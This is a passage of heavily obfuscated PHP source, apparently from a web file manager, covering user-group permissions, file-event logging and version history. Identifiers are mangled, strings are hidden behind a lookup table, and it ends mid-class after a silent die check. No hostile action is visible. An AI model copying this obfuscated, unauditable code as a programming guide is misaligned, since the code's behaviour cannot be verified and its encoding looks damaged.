array($â¯»ä÷[2170] => intval($ÀÕøÃ×ü), $â¯»ä÷[2153] => $¥Ü”ñá, $â¯»ä÷[2171] => $ïúğ‚‚§, $â¯»ä÷[2162] => $Æ„óæ—[$â¯»ä÷[204]]); return $ÉŠ½ıÛ¶; } private function groupContainUser($›š´Áµ½, $Æ±åÎ” = false) { return in_array($›š´Áµ½, $this->userGroupParents($Æ±åÎ”)); } private function groupStepToUserGroup($Ò‚ÇØ—ò, $¹³€€ô• = false) { $Ç²ì¢÷¨ =& $_SERVER[ü¢ÙÊñÛ]; $ğº”˜ô = $this->userGroupList($¹³€€ô•); $¥Î¨é§Œ = 1000; $Å‚šˆÖï = $GLOBALS[$Ç²ì¢÷¨[16]][$Ç²ì¢÷¨[103]][$Ç²ì¢÷¨[2066]] == 1; $“¿€°› = $Å‚šˆÖï ? 3 : 2; foreach ($ğº”˜ô as $Ú¾ÒÆıš) { if ($Ú¾ÒÆıš[$Ç²ì¢÷¨[1959]] == $Ò‚ÇØ—ò) { return 0; } $šÜ£§¶ = explode($Ç²ì¢÷¨[60], trim($Ú¾ÒÆıš[$Ç²ì¢÷¨[595]], $Ç²ì¢÷¨[60])); if ($šÜ£§¶[0] == $Ç²ì¢÷¨[241] && count($šÜ£§¶) > $“¿€°›) { $ë”ï•ÊÌ = array_reverse(array_slice($šÜ£§¶, $“¿€°›)); $‡ˆÎÇ¥‰ = array_search($Ò‚ÇØ—ò, $ë”ï•ÊÌ); if ($‡ˆÎÇ¥‰ !== !1 && $‡ˆÎÇ¥‰ + 1 <= $¥Î¨é§Œ) { $¥Î¨é§Œ = $‡ˆÎÇ¥‰ + 1; } } } return $¥Î¨é§Œ; } private function userGroupList($Áıó£Êñ = false) { $ÛÀâìè =& $_SERVER[ü¢ÙÊñÛ]; static $ÁÕ‚’‰È = array(); if (isset($ÁÕ‚’‰È[$Áıó£Êñ])) { return $ÁÕ‚’‰È[$Áıó£Êñ]; } $÷˜‹Â÷¨ = Model($ÛÀâìè[608])->getInfo($Áıó£Êñ); $ÁÕ‚’‰È[$Áıó£Êñ] = array_to_keyvalue($÷˜‹Â÷¨[$ÛÀâìè[2151]], $ÛÀâìè[1959]); return $ÁÕ‚’‰È[$Áıó£Êñ]; } public function userGroupParents($ñÅ˜‡µ¸) { $ÇÊÃ´ÙË =& $_SERVER[ü¢ÙÊñÛ]; static $ùäâ¥€… = array(); $ñÅ˜‡µ¸ = $ñÅ˜‡µ¸ ? $ñÅ˜‡µ¸ : USER_ID; if (isset($ùäâ¥€…[$ñÅ˜‡µ¸])) { return $ùäâ¥€…[$ñÅ˜‡µ¸]; } $úÂì¦ = $this->userGroupList($ñÅ˜‡µ¸); $¼ùÅúˆº = array(); $²âÏôåó = $GLOBALS[$ÇÊÃ´ÙË[16]][$ÇÊÃ´ÙË[103]][$ÇÊÃ´ÙË[2066]] == 1; $Å·£Â± = $²âÏôåó ? 3 : 2; foreach ($úÂì¦ as $ĞêÀâ…×) { $¶€æ‹ù = array($ĞêÀâ…×[$ÇÊÃ´ÙË[1959]]); $ÏòúüÕÇ = explode($ÇÊÃ´ÙË[60], trim($ĞêÀâ…×[$ÇÊÃ´ÙË[595]], $ÇÊÃ´ÙË[60])); if ($ÏòúüÕÇ[0] == $ÇÊÃ´ÙË[241] && count($ÏòúüÕÇ) > $Å·£Â±) { $öÅÁ—Ë = array_slice($ÏòúüÕÇ, $Å·£Â±); $¶€æ‹ù = array_merge($¶€æ‹ù, array_reverse($öÅÁ—Ë)); } $¼ùÅúˆº = array_merge($¼ùÅúˆº, $¶€æ‹ù); } $ùäâ¥€…[$ñÅ˜‡µ¸] = array_unique($¼ùÅúˆº); return $ùäâ¥€…[$ñÅ˜‡µ¸]; } public function authTargetInfoMake($íƒ›×) { $şê‹¨¯ù =& $_SERVER[ü¢ÙÊñÛ]; $ïÉœ¦Ñô = array(); $™ñ£‚ÖÚ = array(); foreach ($íƒ›× as $Û˜åÊµÊ) { if ($Û˜åÊµÊ[$şê‹¨¯ù[201]] == SourceModel::TYPE_USER) { $ïÉœ¦Ñô[] = intval($Û˜åÊµÊ[$şê‹¨¯ù[580]]); } else { if ($Û˜åÊµÊ[$şê‹¨¯ù[201]] == SourceModel::TYPE_GROUP) { $™ñ£‚ÖÚ[] = intval($Û˜åÊµÊ[$şê‹¨¯ù[580]]); } } } if ($ïÉœ¦Ñô) { $ïÉœ¦Ñô = Model($şê‹¨¯ù[588])->userListInfo($ïÉœ¦Ñô); } if ($™ñ£‚ÖÚ) { $¤—ûË†è = array($şê‹¨¯ù[2051] => array($şê‹¨¯ù[503], $™ñ£‚ÖÚ)); $™ñ£‚ÖÚ = Model($şê‹¨¯ù[596])->field($şê‹¨¯ù[2181])->where($¤—ûË†è)->select(); $™ñ£‚ÖÚ = array_to_keyvalue($™ñ£‚ÖÚ, $şê‹¨¯ù[1959]); } return array($şê‹¨¯ù[2182] => $ïÉœ¦Ñô, $şê‹¨¯ù[2183] => $™ñ£‚ÖÚ); } public function authInfo($êÃß±±Â) { $Œ¸‰æ‚š =& $_SERVER[ü¢ÙÊñÛ]; if ($êÃß±±Â[$Œ¸‰æ‚š[2067]]) { $…§§­óÈ = Model($Œ¸‰æ‚š[582])->listData($êÃß±±Â[$Œ¸‰æ‚š[2067]]); if (!$…§§­óÈ) { return !1; $–¶Œ§¥ù = Model($Œ¸‰æ‚š[582])->listData(); $›ê²ÜõÎ = array_filter_by_field($–¶Œ§¥ù, $Œ¸‰æ‚š[498], $Œ¸‰æ‚š[241]); return $›ê²ÜõÎ; } $½âÙíË” = array_field_key($…§§­óÈ, array($Œ¸‰æ‚š[486], $Œ¸‰æ‚š[42], $Œ¸‰æ‚š[498], $Œ¸‰æ‚š[1982], $Œ¸‰æ‚š[1983])); $½âÙíË”[$Œ¸‰æ‚š[2184]] = $êÃß±±Â; return $½âÙíË”; } else { return array($Œ¸‰æ‚š[504] => 0, $Œ¸‰æ‚š[1965] => $êÃß±±Â[$Œ¸‰æ‚š[2128]], $Œ¸‰æ‚š[505] => $Œ¸‰æ‚š[22], $Œ¸‰æ‚š[1982] => $Œ¸‰æ‚š[2185]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\x65\137\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\144\x65\163\x63", '', "\x69\x6e\163\145\162\164\54\165\x70\x64\141\x74\145\54\x73\x65\154\145\143\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Üóó«Éë, $Õ÷ûæßë, $¨ƒ²£ = '') { $÷®ûŞì× =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->eventSave) { return; } $ÔÚŸÎàï = Model($÷®ûŞì×[1410])->sourceInfo($Üóó«Éë); if (!$ÔÚŸÎàï) { return !1; } if ($this->isDisableEvent($ÔÚŸÎàï, $Õ÷ûæßë)) { return; } if ($¨ƒ²£ && is_string($¨ƒ²£)) { $¨ƒ²£ = array($÷®ûŞì×[1998] => $¨ƒ²£); } $„öÌî™å = defined($÷®ûŞì×[2186]) ? USER_ID : 0; $»şÚŠØÅ = array($÷®ûŞì×[502] => $Üóó«Éë, $÷®ûŞì×[2187] => $ÔÚŸÎàï[$÷®ûŞì×[203]], $÷®ûŞì×[2188] => $ÔÚŸÎàï[$÷®ûŞì×[42]], $÷®ûŞì×[593] => !empty($ÔÚŸÎàï[$÷®ûŞì×[593]]) ? $ÔÚŸÎàï[$÷®ûŞì×[593]] : $÷®ûŞì×[22], $÷®ûŞì×[1750] => $„öÌî™å, $÷®ûŞì×[507] => $Õ÷ûæßë, $÷®ûŞì×[1752] => $¨ƒ²£); $this->addSystemLog($Õ÷ûæßë, $»şÚŠØÅ); unset($»şÚŠØÅ[$÷®ûŞì×[2188]], $»şÚŠØÅ[$÷®ûŞì×[593]]); return $this->add($»şÚŠØÅ); } private function addSystemLog($Üº¿§Œ°, $ş£ÛàóØ) { $ÄòÙ¯Ù« =& $_SERVER[ü¢ÙÊñÛ]; if ($Üº¿§Œ° == $ÄòÙ¯Ù«[2189]) { $Üº¿§Œ° = $ş£ÛàóØ[$ÄòÙ¯Ù«[537]][$ÄòÙ¯Ù«[2190]]; } else { if (in_array($Üº¿§Œ°, array($ÄòÙ¯Ù«[1938], $ÄòÙ¯Ù«[2191]))) { $Üº¿§Œ° = $ş£ÛàóØ[$ÄòÙ¯Ù«[537]][$ÄòÙ¯Ù«[182]]; } } $ñì½É” = array_merge($ş£ÛàóØ, array($ÄòÙ¯Ù«[2192] => $ş£ÛàóØ[$ÄòÙ¯Ù«[204]], $ÄòÙ¯Ù«[2193] => $ş£ÛàóØ[$ÄòÙ¯Ù«[2193]])); Hook::trigger($ÄòÙ¯Ù«[2194], $ÄòÙ¯Ù«[2195] . $Üº¿§Œ°, $ş£ÛàóØ); Model($ÄòÙ¯Ù«[1902])->addLog($ÄòÙ¯Ù«[2195] . $Üº¿§Œ°, $ñì½É”); } private function isDisableEvent($û±‘¦á¤, $Ô³ğĞƒ) { $í–ì©áù =& $_SERVER[ü¢ÙÊñÛ]; if ($û±‘¦á¤[$í–ì©áù[201]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ô³ğĞƒ == $í–ì©áù[1927]) { return !1; } return !0; } public function eventCreate($ÆØºñã¡, $¢ÚŒ”á‚) { $’ºÏ©›ş =& $_SERVER[ü¢ÙÊñÛ]; $Ùé Ò°¥ = Model($’ºÏ©›ş[1410])->sourceInfo($ÆØºñã¡); $¤âø»Î§ = array($’ºÏ©›ş[2190] => $¢ÚŒ”á‚, $’ºÏ©›ş[42] => $Ùé Ò°¥[$’ºÏ©›ş[42]]); return $this->addEvent($ÆØºñã¡, $’ºÏ©›ş[2189], $¤âø»Î§); } public function eventFileEdit($åù½Ğ´) { $ã®ø×ªà =& $_SERVER[ü¢ÙÊñÛ]; $ñÍÑ­†± = array($ã®ø×ªà[2196] => $_SERVER[$ã®ø×ªà[2197]], $ã®ø×ªà[2198] => strtolower(ACTION)); if (isset($GLOBALS[$ã®ø×ªà[17]][$ã®ø×ªà[2199]])) { $ñÍÑ­†±[$ã®ø×ªà[2199]] = $ã®ø×ªà[102]; } return $this->addEvent($åù½Ğ´, $ã®ø×ªà[1928], $ñÍÑ­†±); } public function eventRecycle($ÈÓÛÍ©, $Œ£î¯áâ) { return $this->addEvent($ÈÓÛÍ©, $_SERVER[ü¢ÙÊñÛ][2191], $Œ£î¯áâ); } private static $_removeLast = ''; public function eventRemove($Ü“°Ïğ…) { $Šù×°¸ë =& $_SERVER[ü¢ÙÊñÛ]; self::$_removeLast = $Ü“°Ïğ…; $•àª³ğ = Model($Šù×°¸ë[1410])->sourceInfo($Ü“°Ïğ…); $æìÂ•Â¹ = array_field_key($•àª³ğ, array($Šù×°¸ë[204], $Šù×°¸ë[552], $Šù×°¸ë[516], $Šù×°¸ë[595])); $õ‰å¸²à = array($Šù×°¸ë[182] => $•àª³ğ[$Šù×°¸ë[42]], $Šù×°¸ë[2198] => ACTION, $Šù×°¸ë[2200] => $æìÂ•Â¹); return $this->addEvent($•àª³ğ[$Šù×°¸ë[203]], $Šù×°¸ë[1927], $õ‰å¸²à); } public function eventShare($Èåé¯Å÷, $´®„‘Üø) { return $this->addEvent($Èåé¯Å÷, $_SERVER[ü¢ÙÊñÛ][1938], $´®„‘Üø); } public function eventMove($ıÒ‡ÌğŞ, $ˆ€³¾ûÀ, $êâËÁ) { $û°ÇÍÊÀ =& $_SERVER[ü¢ÙÊñÛ]; if (self::$_removeLast == $ıÒ‡ÌğŞ) { return; } $‚Ş»œÖ¹ = Model($û°ÇÍÊÀ[1410]); $±ÑÑıÁû = $‚Ş»œÖ¹->sourceInfo($ıÒ‡ÌğŞ); $¤‰¡ñ± = $‚Ş»œÖ¹->sourceInfo($ˆ€³¾ûÀ); $¬É¬æº½ = $‚Ş»œÖ¹->sourceInfo($êâËÁ); $ºóĞèŸÖ = array($û°ÇÍÊÀ[1230] => $ˆ€³¾ûÀ, $û°ÇÍÊÀ[2201] => $¤‰¡ñ±[$û°ÇÍÊÀ[42]], $û°ÇÍÊÀ[2177] => !empty($¤‰¡ñ±[$û°ÇÍÊÀ[593]]) ? $¤‰¡ñ±[$û°ÇÍÊÀ[593]] : $û°ÇÍÊÀ[22], $û°ÇÍÊÀ[1231] => $êâËÁ, $û°ÇÍÊÀ[2202] => $¬É¬æº½[$û°ÇÍÊÀ[42]], $û°ÇÍÊÀ[2203] => !empty($¬É¬æº½[$û°ÇÍÊÀ[593]]) ? $¬É¬æº½[$û°ÇÍÊÀ[593]] : $û°ÇÍÊÀ[22]); $this->addEvent($ıÒ‡ÌğŞ, $û°ÇÍÊÀ[634], $ºóĞèŸÖ); $±ÑÑıÁû = $‚Ş»œÖ¹->sourceInfo($ıÒ‡ÌğŞ); $ºóĞèŸÖ = array($û°ÇÍÊÀ[204] => $±ÑÑıÁû[$û°ÇÍÊÀ[204]], $û°ÇÍÊÀ[42] => $±ÑÑıÁû[$û°ÇÍÊÀ[42]]); $this->addEvent($ˆ€³¾ûÀ, $û°ÇÍÊÀ[2204], $ºóĞèŸÖ); } public function eventCopy($³„ö×¼) { $this->eventCreate($³„ö×¼, $_SERVER[ü¢ÙÊñÛ][632]); } public function eventRename($úÌéÑƒõ, $”ÔÆé³Ö, $Å€ËçÆë) { $â£ıíÂ¾ =& $_SERVER[ü¢ÙÊñÛ]; $§Ñû«ÜÜ = array($â£ıíÂ¾[1230] => $”ÔÆé³Ö, $â£ıíÂ¾[1231] => $Å€ËçÆë); return $this->addEvent($úÌéÑƒõ, $â£ıíÂ¾[1424], $§Ñû«ÜÜ); } public function eventAddComment($½Œ¯Ä±ˆ, $î°óóµû) { return $this->addEvent($½Œ¯Ä±ˆ, $_SERVER[ü¢ÙÊñÛ][2205], $î°óóµû); } public function eventAddDesc($”ê×é¡, $ğÁÆòøŸ) { return $this->addEvent($”ê×é¡, $_SERVER[ü¢ÙÊñÛ][2206], $ğÁÆòøŸ); } public function listBySource($º®®ÁÄÉ) { $–ßéÊü· =& $_SERVER[ü¢ÙÊñÛ]; $ºÎœ Üô = Model($–ßéÊü·[1410])->sourceInfo($º®®ÁÄÉ); $¤µ»¹Î’ = array($–ßéÊü·[502] => $º®®ÁÄÉ); if ($ºÎœ Üô[$–ßéÊü·[496]] == $–ßéÊü·[102]) { $•§ë¬ = Model($–ßéÊü·[1410])->listSearchChildren($º®®ÁÄÉ, 20000); $•§ë¬[] = $º®®ÁÄÉ . $–ßéÊü·[64]; $¤µ»¹Î’ = array($–ßéÊü·[204] => array($–ßéÊü·[17], $•§ë¬)); } $şáç„³ü = $this->where($¤µ»¹Î’)->order($–ßéÊü·[2207])->selectPage(); if ($şáç„³ü[$–ßéÊü·[454]][$–ßéÊü·[455]] == 0) { $şáç„³ü[$–ßéÊü·[454]][$–ßéÊü·[455]] = 1; $şáç„³ü[$–ßéÊü·[457]] = array(array($–ßéÊü·[502] => $º®®ÁÄÉ, $–ßéÊü·[2187] => $ºÎœ Üô[$–ßéÊü·[203]], $–ßéÊü·[1750] => $ºÎœ Üô[$–ßéÊü·[538]], $–ßéÊü·[507] => $–ßéÊü·[2208], $–ßéÊü·[508] => $ºÎœ Üô[$–ßéÊü·[244]], $–ßéÊü·[1752] => $–ßéÊü·[22])); } return $this->eventListParse($şáç„³ü, $º®®ÁÄÉ); } private function eventListParse($ÃÑ­ÕÂû, $à­¡åã) { $‘ëôÂ¶ =& $_SERVER[ü¢ÙÊñÛ]; $¶íë— = $ÃÑ­ÕÂû[$‘ëôÂ¶[457]]; $ùÌı“ÛÏ = array_to_keyvalue($¶íë—, $‘ëôÂ¶[22], $‘ëôÂ¶[204]); $øÈ‰İİ« = array_to_keyvalue($¶íë—, $‘ëôÂ¶[22], $‘ëôÂ¶[2193]); foreach ($¶íë— as $ü†Ìò¬) { $ñ»›÷úï = $ü†Ìò¬[$‘ëôÂ¶[537]]; if ($ü†Ìò¬[$‘ëôÂ¶[43]] == $‘ëôÂ¶[634] && isset($ñ»›÷úï[$‘ëôÂ¶[1230]])) { $ùÌı“ÛÏ[] = $ñ»›÷úï[$‘ëôÂ¶[1230]] . $‘ëôÂ¶[22]; $ùÌı“ÛÏ[] = $ñ»›÷úï[$‘ëôÂ¶[1231]] . $‘ëôÂ¶[22]; } if ($ü†Ìò¬[$‘ëôÂ¶[43]] == $‘ëôÂ¶[2204] && isset($ñ»›÷úï[$‘ëôÂ¶[204]])) { $ùÌı“ÛÏ[] = $ñ»›÷úï[$‘ëôÂ¶[204]] . $‘ëôÂ¶[22]; } } $ùÌı“ÛÏ = array_merge($ùÌı“ÛÏ, $øÈ‰İİ«, array($à­¡åã . $‘ëôÂ¶[22])); $ùÌı“ÛÏ = array_unique($ùÌı“ÛÏ); $Ô§‹Ê¦© = array_unique(array_to_keyvalue($¶íë—, $‘ëôÂ¶[22], $‘ëôÂ¶[1759])); $¯õ¶’ = Model($‘ëôÂ¶[608])->userListInfo($Ô§‹Ê¦©); $ïãõ‡ı = Model($‘ëôÂ¶[890])->sourceListInfo($ùÌı“ÛÏ, !0); foreach ($¶íë— as &$ü†Ìò¬) { if ($ü†Ìò¬[$‘ëôÂ¶[43]] == $‘ëôÂ¶[634] && isset($ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[1230]])) { $ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[1230]] = $ïãõ‡ı[$ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[1230]]]; $ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[1231]] = $ïãõ‡ı[$ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[1231]]]; } if ($ü†Ìò¬[$‘ëôÂ¶[43]] == $‘ëôÂ¶[2204] && isset($ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[204]])) { $ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[204]] = $ïãõ‡ı[$ü†Ìò¬[$‘ëôÂ¶[537]][$‘ëôÂ¶[204]]]; } $ü†Ìò¬[$‘ëôÂ¶[101]] = $ïãõ‡ı[$ü†Ìò¬[$‘ëôÂ¶[204]]]; $ü†Ìò¬[$‘ëôÂ¶[2209]] = $ïãõ‡ı[$ü†Ìò¬[$‘ëôÂ¶[2193]]]; if ($ü†Ìò¬[$‘ëôÂ¶[43]] == $‘ëôÂ¶[1927]) { $ü†Ìò¬[$‘ëôÂ¶[2209]] = $ü†Ìò¬[$‘ëôÂ¶[101]]; $ü†Ìò¬[$‘ëôÂ¶[2193]] = $ü†Ìò¬[$‘ëôÂ¶[2209]][$‘ëôÂ¶[204]]; $ü†Ìò¬[$‘ëôÂ¶[101]] = !1; $ü†Ìò¬[$‘ëôÂ¶[204]] = $‘ëôÂ¶[22]; } $ü†Ìò¬[$‘ëôÂ¶[2136]] = $¯õ¶’[$ü†Ìò¬[$‘ëôÂ¶[1759]]]; } unset($ü†Ìò¬); $ÃÑ­ÕÂû[$‘ëôÂ¶[457]] = $¶íë—; return $ÃÑ­ÕÂû; } public function removeBySource($Æ÷¸“¢‹) { $âæåî¾Å = array($_SERVER[ü¢ÙÊñÛ][502] => $Æ÷¸“¢‹); $this->where($âæåî¾Å)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\143\145\x5f\150\x69\163\164\157\x72\171"; public function historyCount($‚¤Ê­¾) { $ó´´’‡Š =& $_SERVER[ü¢ÙÊñÛ]; if (!$‚¤Ê­¾) { return array(); } if (is_string($‚¤Ê­¾) || is_int($‚¤Ê­¾)) { $‚¤Ê­¾ = array($‚¤Ê­¾); } $ÎĞàãÁë = array($ó´´’‡Š[204], $ó´´’‡Š[2210] => $ó´´’‡Š[576]); $È× €»” = array($ó´´’‡Š[204] => array($ó´´’‡Š[17], $‚¤Ê­¾)); $Î’ÆÍ²¦ = $this->field($ÎĞàãÁë)->where($È× €»”)->group($ó´´’‡Š[204])->select(); return array_to_keyvalue($Î’ÆÍ²¦, $ó´´’‡Š[204], $ó´´’‡Š[576]); } public function addHistory($ªÓ‹ÈÆ•, $ª›îßğ» = '') { $¯ù±àü =& $_SERVER[ü¢ÙÊñÛ]; $Ä¡–×ú… = array($¯ù±àü[502] => $ªÓ‹ÈÆ•[$¯ù±àü[204]], $¯ù±àü[1750] => isset($ªÓ‹ÈÆ•[$¯ù±àü[540]]) ? $ªÓ‹ÈÆ•[$¯ù±àü[540]] : $ªÓ‹ÈÆ•[$¯ù±àü[538]], $¯ù±àü[553] => $ªÓ‹ÈÆ•[$¯ù±àü[552]], $¯ù±àü[631] => $ªÓ‹ÈÆ•[$¯ù±àü[90]], $¯ù±àü[2211] => $ª›îßğ»); if ($GLOBALS[$¯ù±àü[16]][$¯ù±àü[103]][$¯ù±àü[1291]] >= 1) { $this->historyAutoClear($Ä¡–×ú…[$¯ù±àü[204]]); $this->add($Ä¡–×ú…); } Hook::trigger($¯ù±àü[2212], $Ä¡–×ú…); Model($¯ù±àü[2213])->eventFileEdit($ªÓ‹ÈÆ•[$¯ù±àü[204]]); } private function historyAutoClear($„õæÔ˜¿) { $÷Òˆ¡å¿ =& $_SERVER[ü¢ÙÊñÛ]; $‘­¡½¹İ = Model($÷Òˆ¡å¿[835])->get($÷Òˆ¡å¿[1313]); $©²È¬Ôñ = intval($GLOBALS[$÷Òˆ¡å¿[16]][$÷Òˆ¡å¿[103]][$÷Òˆ¡å¿[1291]]); $•×Óä¨ = $‘­¡½¹İ == $÷Òˆ¡å¿[1314] ? min(5, $©²È¬Ôñ) : $©²È¬Ôñ; $•×Óä¨ = $•×Óä¨ <= 0 ? 0 : $•×Óä¨ - 1; if ($•×Óä¨ >= 499) { return; } $Í¹ˆ‘ıÆ = array($÷Òˆ¡å¿[502] => $„õæÔ˜¿); $ÑèÍÚŒÄ = $this->field($÷Òˆ¡å¿[2214])->where($Í¹ˆ‘ıÆ)->order($÷Òˆ¡å¿[2207])->select(); if (!$ÑèÍÚŒÄ || $•×Óä¨ >= count($ÑèÍÚŒÄ)) { return; } $¡‘ş­¾ş = array_to_keyvalue($ÑèÍÚŒÄ, $÷Òˆ¡å¿[22], $÷Òˆ¡å¿[486]); $¡‘ş­¾ş = array_slice($¡‘ş­¾ş, $•×Óä¨); $Æˆª‰šü = array_to_keyvalue($ÑèÍÚŒÄ, $÷Òˆ¡å¿[22], $÷Òˆ¡å¿[552]); $Æˆª‰šü = array_slice($Æˆª‰šü, $•×Óä¨); if (!$¡‘ş­¾ş || !$Æˆª‰šü) { return; } $Í¹ˆ‘ıÆ = array($÷Òˆ¡å¿[504] => array($÷Òˆ¡å¿[17], $¡‘ş­¾ş)); $this->where($Í¹ˆ‘ıÆ)->delete(); Model($÷Òˆ¡å¿[555])->remove($Æˆª‰šü); } public function listData($­ÚãÏı) { $Å¤àĞş› =& $_SERVER[ü¢ÙÊñÛ]; $ĞÅìÎŒù = array($Å¤àĞş›[502] => $­ÚãÏı); $â™»õâƒ = $Å¤àĞş›[2215]; $ûúüî›ş = $this->field($â™»õâƒ)->where($ĞÅìÎŒù)->order($Å¤àĞş›[2207])->selectPage(); $this->_listAppendUser($ûúüî›ş[$Å¤àĞş›[457]]); $ØãšÖò¹ = Model($Å¤àĞş›[835])->get($Å¤àĞş›[1313]); $ñÙ…² = 5; if ($ØãšÖò¹ == $Å¤àĞş›[1314]) { $ûúüî›ş[$Å¤àĞş›[457]] = array_slice($ûúüî›ş[$Å¤àĞş›[457]], 0, $ñÙ…²); $ûúüî›ş[$Å¤àĞş›[454]] = array($Å¤àĞş›[2216] => 1, $Å¤àĞş›[2217] => 20, $Å¤àĞş›[2218] => 1, $Å¤àĞş›[2219] => count($ûúüî›ş[$Å¤àĞş›[457]])); } return $ûúüî›ş; } protected function _listAppendUser(&$å‰ó¿¯ª) { $‚êıŸ =& $_SERVER[ü¢ÙÊñÛ]; $ä«…ÍÊ½ = array_to_keyvalue($å‰ó¿¯ª, $‚êıŸ[22], $‚êıŸ[1759]); $Œ­÷·±Š = Model($‚êıŸ[608])->userListInfo($ä«…ÍÊ½); foreach ($å‰ó¿¯ª as &$¢œÅ’ëÉ) { $öÄæó = $¢œÅ’ëÉ[$‚êıŸ[1759]]; $¢œÅ’ëÉ[$‚êıŸ[538]] = $Œ­÷·±Š[$öÄæó] ? $Œ­÷·±Š[$öÄæó] : !1; } unset($¢œÅ’ëÉ); } public function fileInfo($»ƒÒ§”Æ) { $ôÉšªïö =& $_SERVER[ü¢ÙÊñÛ]; $²ûÌ€ÜÑ = $this->tablePrefix; $¼Ø¿ã× = "{$²ûÌ€ÜÑ}\151\x6f\137\146\151\154\x65\x20\146\x69\154\145\x73\40\x6f\x6e\x20\146\151\154\145\163\x2e\x66\151\x6c\x65\111\x44\40\75\40\150\x69\x73\x74\157\x72\x79\56\x66\x69\154\x65\x49\104"; return $this->alias($ôÉšªïö[2220])->where(array($ôÉšªïö[504] => $»ƒÒ§”Æ))->join($¼Ø¿ã×, $ôÉšªïö[2221])->find(); } public function removeItem($§Æ—ùÌá) { $ä€¢ë·Ã =& $_SERVER[ü¢ÙÊñÛ]; $Ø•û—Ø² = array($ä€¢ë·Ã[504] => $§Æ—ùÌá); $öÎÒ¤âÒ = $this->where($Ø•û—Ø²)->find(); if ($öÎÒ¤âÒ) { $Ñ½ü¸ğ¿ = $this->where($Ø•û—Ø²)->delete(); Model($ä€¢ë·Ã[555])->remove($öÎÒ¤âÒ[$ä€¢ë·Ã[552]]); return $Ñ½ü¸ğ¿; } return !1; } public function removeBySource($ö«ÄÅ¦±) { $ÎÏ¬¡Ûº =& $_SERVER[ü¢ÙÊñÛ]; if (!$ö«ÄÅ¦±) { return !1; } if (!is_array($ö«ÄÅ¦±)) { $ö«ÄÅ¦± = array($ö«ÄÅ¦±); } $‰ä–Ö€ß = array($ÎÏ¬¡Ûº[502] => array($ÎÏ¬¡Ûº[17], $ö«ÄÅ¦±)); $ş°Ë•—Ê = $this->field($ÎÏ¬¡Ûº[553])->where($‰ä–Ö€ß)->select(); if ($ş°Ë•—Ê) { $this->where($‰ä–Ö€ß)->delete(); $‰ñÌõŞ = array_to_keyvalue($ş°Ë•—Ê, $ÎÏ¬¡Ûº[22], $ÎÏ¬¡Ûº[552]); Model($ÎÏ¬¡Ûº[555])->remove($‰ñÌõŞ); } return !0; } public function setDetail($«Íªúè‰, $×š¨ßÉ¿) { $Š±Îš•ñ =& $_SERVER[ü¢ÙÊñÛ]; return $this->where(array($Š±Îš•ñ[504] => $«Íªúè‰))->save(array($Š±Îš•ñ[2211] => $×š¨ßÉ¿)); } public function rollbackToItem($Ø öÁ, $¼‘†ãÚ¶) { $×’Ù­é =& $_SERVER[ü¢ÙÊñÛ]; $³®ÔøÉ = Model($×’Ù­é[890])->sourceInfo($Ø öÁ); $this->addHistory($³®ÔøÉ, LNG($×’Ù­é[2222])); $ÚĞÜ™š¥ = $this->find($¼‘†ãÚ¶); $Æß‰èÏ = array($×’Ù­é[552] => $ÚĞÜ™š¥[$×’Ù­é[552]], $×’Ù­é[90] => $ÚĞÜ™š¥[$×’Ù­é[90]], $×’Ù­é[99] => time(), $×’Ù­é[540] => USER_ID); Model($×’Ù­é[890])->where(array($×’Ù­é[204] => $Ø öÁ))->save($Æß‰èÏ); return $this->where(array($×’Ù­é[504] => $¼‘†ãÚ¶))->delete(); } public function clearSame($ï€ß±ÉÜ) { $ãÙõ”€Ú =& $_SERVER[ü¢ÙÊñÛ]; $ïûİ¢‹ª = $this->listData($ï€ß±ÉÜ); $§Ã»ïÛ¡ = array_to_keyvalue_group($ïûİ¢‹ª, $ãÙõ”€Ú[552]); $ø‡òÆŒœ = array(); $½¢ëŸÄ» = array(); foreach ($§Ã»ïÛ¡ as $±¬ŠŠ€©) { if (!$±¬ŠŠ€© || count($±¬ŠŠ€©) <= 1) { continue; } foreach ($±¬ŠŠ€© as $‹€ŸøŒñ) { $ø‡òÆŒœ[] = $‹€ŸøŒñ[$ãÙõ”€Ú[552]]; $½¢ëŸÄ»[] = $‹€ŸøŒñ[$ãÙõ”€Ú[486]]; } } if (!$½¢ëŸÄ») { return; } $this->where(array($ãÙõ”€Ú[486] => array($ãÙõ”€Ú[17], $½¢ëŸÄ»)))->delete(); Model($ãÙõ”€Ú[555])->remove($ø‡òÆŒœ); } public function userSpace() { $éµªõµ¢ =& $_SERVER[ü¢ÙÊñÛ]; $ö§ªœÀ = $this->tablePrefix; $Ó¦Á æ´ = array($éµªõµ¢[1750] => USER_ID); $Ê¯¼ıÊã = "{$ö§ªœÀ}\x69\157\137\x66\151\x6c\145\x20\x66\x69\x6c\x65\163\x20\x6f\156\x20\146\x69\x6c\x65\x73\x2e\x66\151\x6c\145\x49\104\40\75\40\x68\x69\x73\164\157\x72\171\x2e\146\x69\154\145\x49\104"; return $this->alias($éµªõµ¢[2220])->where($Ó¦Á æ´)->join($Ê¯¼ıÊã, $éµªõµ¢[2221])->sum($éµªõµ¢[90]); } } goto Aà»÷ÀÚ§; a›à±¿÷©‡: $hxlsumkpdr = $_SERVER[ü¢ÙÊñÛ][696]; if (!$hxlsumkpdr) { die; } class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($ˆÑ‘éÀ) { $íÆ×ğ€Ã =& $_SERVER[ü¢ÙÊñÛ]; 